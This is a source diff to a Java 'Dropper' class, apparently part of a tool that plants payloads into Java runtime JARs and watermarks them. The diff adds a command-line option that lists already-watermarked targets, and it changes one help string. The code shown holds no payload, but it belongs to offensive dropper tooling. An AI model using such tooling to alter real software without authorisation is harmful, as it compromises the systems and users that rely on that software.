@@ -97,8 +97,13 @@ public class Dropper {
 	
 	private static final String SEARCH_DIRECTORIES_LONG_ARGUMENT = "--search-directories";
 	private static final String SEARCH_DIRECTORIES_SHORT_ARGUMENT = "-s";
-	private static final String SEARCH_DIRECTORIES_DESCRIPTION = "     Specifies a comma separated list of directory paths to search for runtimes, if not specified a default set of search directories will be used.";
+	private static final String SEARCH_DIRECTORIES_DESCRIPTION = "     Specifies a comma separated list of directory paths to search for targetes, if not specified a default set of search directories will be used.";
 
+	private static final String PRINT_WATERMARKED_LONG_ARGUMENT = "--print-watermarked";
+	private static final String PRINT_WATERMARKED_SHORT_ARGUMENT = "-pw";
+	private static final String PRINT_WATERMARKED_DESCRIPTION = "     Prints watermarked targets found on search paths.";
+	private static boolean printWatermarked = false;
+	
 	private static boolean watermark = true;
 	private static final String DISABLE_WATERMARK_LONG_ARGUMENT = "--disable-watermarking";
 	private static final String DISABLE_WATERMARK_SHORT_ARGUMENT = "-dw";
@@ -136,6 +141,7 @@ public class Dropper {
 													+ IGNORE_WATERMARK_LONG_ARGUMENT + ", " + IGNORE_WATERMARK_SHORT_ARGUMENT + IGNORE_WATERMARK_DESCRIPTION + "\n"
 													+ WATCHER_LONG_ARGUMENT + ", " + WATCHER_SHORT_ARGUMENT + WATCHER_DESCRIPTION + "\n"
 													+ WATCHER_SLEEP_TIME_LONG_ARGUMENT + ", " + WATCHER_SLEEP_TIME_SHORT_ARGUMENT + WATCHER_SLEEP_TIME_DESCRIPTION + "\n"
+													+ PRINT_WATERMARKED_LONG_ARGUMENT + ", " + PRINT_WATERMARKED_SHORT_ARGUMENT + PRINT_WATERMARKED_DESCRIPTION + "\n"
 													+ PRINT_TARGETS_LONG_ARGUMENT + ", " + PRINT_TARGETS_SHORT_ARGUMENT + PRINT_TARGETS_DESCRIPTION + "\n"
 													+ PRINT_PAYLOADS_LONG_ARGUMENT + ", " + PRINT_PAYLOADS_SHORT_ARGUMENT + PRINT_PAYLOADS_DESCRIPTION + "\n"
 													+ DEBUG_LONG_ARGUMENT + ", " + DEBUG_SHORT_ARGUMENT + DEBUG_DESCRIPTION + "\n"
@@ -172,6 +178,10 @@ public class Dropper {
 			
 			else if(args[i].equals(REPLACE_TARGET_LONG_ARGUMENT) || args[i].equals(REPLACE_TARGET_SHORT_ARGUMENT)){
 				replaceTarget = true;
+			}
+			
+			else if(args[i].equals(PRINT_WATERMARKED_LONG_ARGUMENT) || args[i].equals(PRINT_WATERMARKED_SHORT_ARGUMENT)){
+				printWatermarked = true;
 			}
 			
 			else if(args[i].equals(PRINT_TARGETS_LONG_ARGUMENT) || args[i].equals(PRINT_TARGETS_SHORT_ARGUMENT)){
@@ -288,6 +298,19 @@ public class Dropper {
 		}
 		
 		if(debug) System.out.println(configuration);
+		
+		if(printWatermarked){
+			for(File target : getTargets(searchPaths, configuration)){
+				try {
+					if(new JarModifier(target).getJarEntrySet().contains(WATERMARK)){
+						System.out.println("Watermarked Target: " + target.getAbsolutePath());
+					}
+				} catch (Exception e){
+					// couldn't read target entries
+				}
+			}
+			System.exit(0);
+		}
 		
 		// modify runtimes
 		Set<String> targetsToIgnore = new HashSet<String>();
